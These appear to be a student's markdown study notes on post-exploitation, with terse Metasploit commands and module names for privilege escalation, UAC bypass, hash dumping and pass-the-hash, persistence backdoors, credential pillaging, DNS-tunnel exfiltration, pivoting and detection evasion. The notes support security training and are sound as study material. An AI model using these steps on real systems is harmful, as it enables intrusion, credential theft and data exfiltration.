

# **Privilege Escalation:**
- Vertical: lower to higher privilege user.
- Horizontal: switching identities but same level.

Migrate to stability as soon as you get the shell.


![[Pasted image 20230301182444.png]]



Metasploit command to check Privileges on windows 
`getprivs`

To check the Privileges on Windows (same as above)
`post/windows/gather/win_privs`

Post exploitation by bypassing UAC on windows
`exploit/windows/local/bypassuac_injection`

github.com/hfiref0x/UACME
other tools

`wmic` is used to query all services and their associated binary path

--- 
#### Unquoted service path Post Exploitation

to find the uncoated path run this on the compromised windows machine
![[Pasted image 20230227213842.png]]
![[Pasted image 20230301182917.png]]
![[Pasted image 20230301182948.png]]
![[Pasted image 20230301183041.png]]

![[Pasted image 20230301183210.png]]


----

If session is unstable and getting disconnected, we can use `set AutoRunScript migrate -n svchost.exe` to migrate to svchost as soon as we get a shell.

---

# Maintaining the Access
![[Pasted image 20230301183652.png]]

#### Dumping hashes

if `hashdump` fails:
	1. `run hashdump`
	2. Migrate to different process
	3. Priv Esc

#### pass the hash

`use exploit/windows/smb/psexec`

If having problem passing the hashes, we can use this.
![[Pasted image 20230301184423.png]]

![[Pasted image 20230301184442.png]]

https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/

##### Pass the hash over RDP

![[Pasted image 20230301184622.png]]

---
#### Cracking the Hashes

**Mimikatz**
- Used to retrieve plaintext passwd, Kerberos tickets, perform pass-the-hash.
- works best on x64 meterpreter shell
- `ps -A x86_64 s` can be use to see and migrate to x64 process
- `wdiges` is on the cmd of mimikatz
- 

**Windows Credentials Editor**
- Windows binary and need to transfer it to compromised machine

---
RDP 

1. check the enabled services by running `net start`
2. this can be used ![[Pasted image 20230301185759.png]]
3. `run service_manager -l` (meterpreter script)
4. run `post/windows/gather/enum_services`

to run RDP use `run getgui -e`

to add the user we own into RDP allowed group
![[Pasted image 20230301190139.png]]


![[Pasted image 20230301190224.png]]


---
# Backdoor

Meterpreter steps:
	`exploit/windows/local/persistence`

Manual:
	1. create payload and upload
	2. ![[Pasted image 20230301190516.png]]
	3. ![[Pasted image 20230301190530.png]]

#### Adding a new user
![[Pasted image 20230301190610.png]]

---

#### DLL Hijacking, DLL preloading, or Insecure Library Loading

![[Pasted image 20230301190725.png]]
![[Pasted image 20230301190737.png]]

---


send email using python
https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/

---

# Pillaging (Data harvesting)

![[Pasted image 20230302075743.png]]
![[Pasted image 20230302075819.png]]

1. `sysinfo`
2. `getuid`
3. `run post/[windows/linux]/gather`
4. `run post/windows/gather/enum_service` or ![[Pasted image 20230302082217.png]]
5. `net start` -  list all the current running services
6. `service --status-all` - list all the current running services on linux
7. `ps` - list all the running processes
8. `net view /domain` or `enum_domain` from Metasploit
9. `net group "Domain COntrollers" /domain` - list Domain Controllers
10. `net user` for Windows and `cat /etc/passwd` in Linux to list all the users
11. `net localgroup` - to list the user's group
12. `net share` or `enum_shares` to display all the resources shared on the victim.
13. `run winenum`
14. `run post/[windows/linux]/gather/credentials`
15. `run post/[windows/linux]/gather/enum_applications`

Resources:

Post Exploitation Wiki: https://github.com/mubix/post-exploitation-wiki

Windows: https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US

Linux: https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US

OSX: https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US

Metasploit: https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1


#### Using DNS(DNS tunneling) for Exfiltration 

![[Pasted image 20230302084932.png]]

`lodine` - https://code.kryo.se/iodine/

![[Pasted image 20230302085136.png]]


## Info gather after exploitation
1. `sysinfo`
2. `getuid`
3. `run post/[windows/linux]/gather`
4. `run post/windows/gather/enum_service` or ![[Pasted image 20230302082217.png]]
5. `net start` -  list all the current running services
6. `service --status-all` - list all the current running services on linux
7. `ps` - list all the running processes
8. `net view /domain` or `enum_domain` from Metasploit
9. `net group "Domain COntrollers" /domain` - list Domain Controllers
10. `net user` for Windows and `cat /etc/passwd` in Linux to list all the users
11. `net localgroup` - to list the user's group
12. `net share` or `enum_shares` to display all the resources shared on the victim.
13. `run winenum`
14. `run post/[windows/linux]/gather/credentials`
15. `run post/[windows/linux]/gather/enum_applications`


---
#### Mapping

`ipconfig /displaydns` - to see the network info from DNS cache

`netstat -ano` - check all the incoming and outgoing connections

`use post/multi/gather/ping_sweep` - perform ping sweep to find hosts within the network

`run arp_scanner` - to find hosts using ARP

`use post/windows/manage/autoroute `

`use auxiliary/server/socks4a` - proxy server that relays connections using the built-in Metasploit routing
![[Pasted image 20230304103039.png]]
![[Pasted image 20230304103209.png]]
![[Pasted image 20230304103227.png]]

`portfwd` is also an option - Metasploit module
![[Pasted image 20230304103415.png]]


Option 1: use autoroute to connect to Victim2 from Victim1 and once the Victim2 is compromised initiate reverse shell on attacker, the  communication started with attacker -> victim1 -> victim2 -> attacker and then now connection will be attacker <-> victim2

Option 2: if we set the lhost to victim1 the communication will be:
attacker <-> victim1 <-> victim2, instead of attacker <-> victim2



---
### Meterpreter SSL Certificate Impersonation and Detection Evasion

1. `impersonate_ssl`  - Metasploit.
2. ![[Pasted image 20230304094931.png]]
3. ![[Pasted image 20230304095254.png]]
4. ![[Pasted image 20230304095347.png]]
5. Download the payload.exe on the victim


---
# `SessionGopher`
PowerShell script to Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP.



